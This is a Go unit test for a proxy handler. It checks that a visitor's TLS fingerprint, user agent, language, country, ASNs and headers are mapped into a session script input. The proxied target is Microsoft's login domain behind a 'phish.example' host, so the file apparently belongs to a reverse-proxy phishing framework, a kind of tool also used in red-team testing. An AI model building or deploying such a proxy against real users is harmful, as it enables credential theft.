package proxy

import (
	"net/http/httptest"
	"testing"

	"go.uber.org/zap"
)

// TestBuildScriptRequestInput_MapsConnectionFields checks that the session
// script input carries the incoming connection with the expected keys, lower
// case headers, and a non nil empty asns slice when no ipdata store is loaded.
func TestBuildScriptRequestInput_MapsConnectionFields(t *testing.T) {
	m := &ProxyHandler{logger: zap.NewNop().Sugar()}
	req := httptest.NewRequest("GET", "https://phish.example/login", nil)
	req.Header.Set("User-Agent", "UA/1.0")
	req.Header.Set("Accept-Language", "en-US")
	req.Header.Set("X-JA4", "t13d1516h2_test")
	reqCtx := &RequestContext{TargetDomain: "login.microsoftonline.com"}

	in := m.buildScriptRequestInput(req, reqCtx)

	if in["ja4"] != "t13d1516h2_test" {
		t.Fatalf("ja4 = %v, want t13d1516h2_test", in["ja4"])
	}
	if in["userAgent"] != "UA/1.0" {
		t.Fatalf("userAgent = %v, want UA/1.0", in["userAgent"])
	}
	if in["acceptLanguage"] != "en-US" {
		t.Fatalf("acceptLanguage = %v, want en-US", in["acceptLanguage"])
	}
	if in["targetDomain"] != "login.microsoftonline.com" {
		t.Fatalf("targetDomain = %v, want login.microsoftonline.com", in["targetDomain"])
	}
	// the test binary loads no ipdata store, and the httptest client IP is in a
	// reserved range, so country is empty and asns is empty but not nil.
	if in["country"] != "" {
		t.Fatalf("country = %v, want empty", in["country"])
	}
	asns, ok := in["asns"].([]map[string]interface{})
	if !ok {
		t.Fatalf("asns type = %T, want []map[string]interface{}", in["asns"])
	}
	if len(asns) != 0 {
		t.Fatalf("asns len = %d, want 0", len(asns))
	}
	headers, ok := in["headers"].(map[string]interface{})
	if !ok {
		t.Fatalf("headers type = %T, want map[string]interface{}", in["headers"])
	}
	if headers["x-ja4"] != "t13d1516h2_test" {
		t.Fatalf("headers[x-ja4] = %v, want the header value under a lower case key", headers["x-ja4"])
	}
	if _, ok := in["ip"].(string); !ok {
		t.Fatalf("ip = %v, want a string", in["ip"])
	}
}
